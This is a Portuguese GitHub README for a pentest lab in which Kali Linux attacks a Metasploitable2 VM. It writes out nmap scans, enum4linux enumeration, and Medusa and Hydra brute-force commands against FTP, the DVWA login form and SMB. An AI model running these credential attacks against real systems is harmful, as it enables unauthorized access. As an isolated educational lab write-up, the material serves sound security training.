# Projeto Análise de Vulnerabilidades Metasploitable 2 com Kali Linux (Pentest)

## Qual é o objetivo do repositório?

Este repositório documenta **passo a passo** a montagem de um laboratório de Pentest/testes de invasão realizados contra a VM vulnerável **Metasploitable2**, utilizando o **Kali Linux** como máquina atacante.

- Escopo: configuração de duas VMs no VirtualBox em rede host-only, reconhecimento de serviços, ataques de força bruta e password spraying, validação de acessos, e recomendações de mitigação.
- Resultados esperados: demonstração reprodutível dos passos, comandos, wordlists utilizadas e análise de riscos e correções aplicáveis.

## Ambiente e Topologia
- Hypervisor: Oracle VirtualBox.
- VM Atacante: Kali Linux (última versão estável disponível no laboratório).
- VM Alvo: Metasploitable2.
- Rede: Host-only / Internal Network para isolamento do laboratório.
- Endereços:
- Kali: 192.168.56.5;
- Metasploitable2: 192.168.56.4.
  
> Dica: use snapshots antes de cada experimento para permitir rollback rápido.

## O que é Metasploitable 2?

Metasploitable 2 é uma máquina virtual vulnerável, mantida pela Rapid7, projetada para fins educacionais em segurança ofensiva.  
**Atenção:** nunca exponha esta VM à internet, use apenas em ambientes isolados.

Como usar este repositório
1. Instale o VirtualBox.  
2. Baixe as imagens do [Kali Linux](https://www.kali.org/get-kali/#kali-platforms) e [Metasploitable2](https://www.rapid7.com/products/metasploit/metasploitable/).  
3. Configure a rede host-only.  
4. Siga os tutoriais de reconhecimento, exploração e mitigação.

## Conteúdo
- Reconhecimento de serviços (`nmap`)  
- Ataques de força bruta (`hydra`)  
- Password spraying  
- Validação de acessos

---
  
**ATENÇÃO: Este projeto é apenas para fins educacionais em ambiente controlado. Nenhuma ferramenta utilizada nesse repositório deve ser usada em sistemass ou em redes sem autorização. O autor do projeto não se responsabiliza pelo mal uso das ferramentas demonstradas.**

## Configuração do Ambiente

### Kali Linux

<img width="1120" height="623" alt="image" src="https://github.com/user-attachments/assets/fc7d3bfb-88c6-4cab-b7e6-191657f0eadb" />

### Metasploitable 2

<img width="1129" height="618" alt="image" src="https://github.com/user-attachments/assets/97cb0135-1e78-40b5-9763-73cbabf1bd4d" />

## Teste de conexão

Para testar a conexão entre as duas máquinas virtuais, vamos utilizar o comando `ping`, para enviar pacotes icmp e testar a conexão dos hosts da rede.

Digite o comando no terminal:

```bash
ping -c 4 [endereço ip do metasploitable2]
```

Exemplo: 
```bash
ping -c 4 192.168.56.4
```
<img width="737" height="488" alt="image" src="https://github.com/user-attachments/assets/7c30a8ce-0a6e-4848-8568-3cfb28890008" />

## Reconhecimento das portas com Nmap

Para reconhecimento padrão vamos executar o comando `nmap` [endereço ip do metaspliotable2]. 

Exemplo: 

```bash
nmap 192.168.56.3
```

<img width="751" height="542" alt="image" src="https://github.com/user-attachments/assets/ae822b03-81e1-4604-9203-e0acefd3516e" />

Vamos focar nas portas 21, 22, 80, 445 e 139 com o comando:

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.4
```

<img width="749" height="354" alt="image" src="https://github.com/user-attachments/assets/02eb7687-08c4-4907-8282-aaf84fa2dc41" />

## Ataque de força bruta no serviço ftp

Pode-se identificar a porta 21 (FTP), onde a mesma é utilizada para tranferência de arquivos. Nesse protocolo é possível realizar o download ou upload de arquivos do computador.

### Reconhecimento da porta utilizando o Nmap

<img width="754" height="354" alt="Captura de tela 2025-10-12 225932" src="https://github.com/user-attachments/assets/92896092-9234-4c6e-8262-8f9dabfceb65" />

### Criação das wordlists

Nesta etapa criamos duas wordlists. Uma lista com os nome de usuários e outra com as possíveis senhas. Segue abaixo os comandos para a criação das listas:

Criação da lista de usuários:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

Criação da lista de senhas:
```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Medusa: Ataque de brute force utilizando as wordlists criadas

Nesta etapa vamos utilizar a ferramenta `Medusa` para realizar um ataque de força bruta utilizando as listas na porta 21 do serviço `ftp`. Segue o comando abaixo:

```bash
medusa -h 192.168.56.4 -U users.txt -P pass.txt -M ftp -t 6
```
<img width="1062" height="424" alt="Captura de tela 2025-10-14 125415" src="https://github.com/user-attachments/assets/cdc00c71-7c8c-4160-b7a0-be775e03a0a2" />

### Acessando o serviço FTP com as credenciais encontradas

<img width="335" height="199" alt="image" src="https://github.com/user-attachments/assets/f203430c-9f95-4f91-9f22-80e549275e88" />

## Ataque em formulários em aplicações web (DVWA)

Os ataques de força bruta também podem ser testados em aplicações web que possuem formulários de login. Com isso, um atacante que possuir uma lista de usuários e lista de senhas vazadas conseguem utilizar ferramentas para estabelecer o acesso com tentativas e erros.

### Reconhecimento do comportamento do formulário

Para identificar a requisição do formulário é necessário utilizar a ferramenta do navegador chamado de `DevTools`´, geralmente podemos abrir com a tecla `F12` do teclado. Dessa forma, é possível visualizar quais são os campos usados na requisição, e precisamos deles para utilizar na ferramenta de força bruta. Segue abaixo o reconhecimento.

**Identificação dos campos da requisição**

<img width="1357" height="561" alt="Captura de tela 2025-10-14 131331" src="https://github.com/user-attachments/assets/fc441b4e-caf7-4b7b-a095-11012200ed76" />

Na imagem, podemos ver na aba `Request/Requisição` os campos necessárois no formulário para realizar o login, sendo eles: username, password e Login.

### Criação das wordlists

Criação da lista de usuários:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

Criação da lista de senhas:
```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Ataque de força bruta no formulário de Login

Nesta etapa utilizaremos o `Medusa` para atacar a aplicação web utilizando as wordlists criadas. Para esse ataque é usado os campos do reconhecimento do formulário com a ajuda do `DevTools`. Com todas essa informações podemos seguir para o comando:

```bash
medusa -h 192.168.56.4 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

---

<img width="1341" height="550" alt="image" src="https://github.com/user-attachments/assets/e304d96c-d4d2-470c-a7fc-499db9a7b566" />

---

**Utilizando a ferramenta Hydra**

Essa é outra ferramenta poderosa de brute force, com ela podemos utilizar as flags passando as wordlists e o formulário da aplicação. Veja abaixo o comando e o resultado com o hydra.

Comando:
```bash
hydra -L users.txt -P pass.txt 192.168.56.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```

<img width="685" height="497" alt="image" src="https://github.com/user-attachments/assets/5e369eee-21fe-48d0-bdb1-9a1a2bc63969" />

---

O usuário e senha encontrados foram, admin e password.

## Ataque ao serviço smb (samba)

O serviço smb são ciomumente utilizados para o compartilhamento de arquivos, impressoras e outros recursos entre computadores em uma rede local.

### Reconhecimento do serviço smb na rede

Para identificarmos que o serviço smb está ativo na rede, vamos utilizar a flag `-p` do nmap e passar a porta `445`. Segue o comando abaixo.

```bash
nmap -sV -p 445 192.168.56.4
```

---

<img width="709" height="278" alt="Captura de tela 2025-10-14 143806" src="https://github.com/user-attachments/assets/0d38388b-eae0-4876-ba5b-cc19b68cc231" />

---

Na imagem, podemos ver que a porta 445 está com o status `open`, ou seja, está aceitando acesso sem filtragem do firewall. Nesse caso, podemos iniciar a enumeração na porta para coletar o máximo de informações possíveis do host. Além disso, vamos guardar as informações em um arquivo em formato `txt` chamado de enum4_output. Segue o comando:

```bash
enum4linux -a 192.168.56.4 | tee enum4_output.txt
```

---

Após a enumeração e análise do arquivo foi encontrado os usuários do metasploitable:

<img width="825" height="517" alt="Captura de tela 2025-10-14 150140" src="https://github.com/user-attachments/assets/ecee79bd-9a4d-43f5-b864-cd501987b695" />

### Criação das wordlists

Com as informações dos possíveis usuários, podemos seguir para a criação das wordlists. Segue os comandos abaixo:

Criação dos usuários
```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

---

Criação das senhas
```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### Aplicando o brute force no serviço smb

Para iniciar o ataque de força bruta com o `medusa`, precisamos rodar o seguinte comando:

```bash
medusa -h 192.168.56.4 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

---

<img width="1033" height="486" alt="Captura de tela 2025-10-14 145647" src="https://github.com/user-attachments/assets/38fa3a5e-c48f-4cdc-8583-23de2d0c2efd" />

---

### Teste de login com o usuário msfadmin

<img width="653" height="362" alt="image" src="https://github.com/user-attachments/assets/e5d8e4c7-b7c0-4949-9629-5160fd9c4276" />

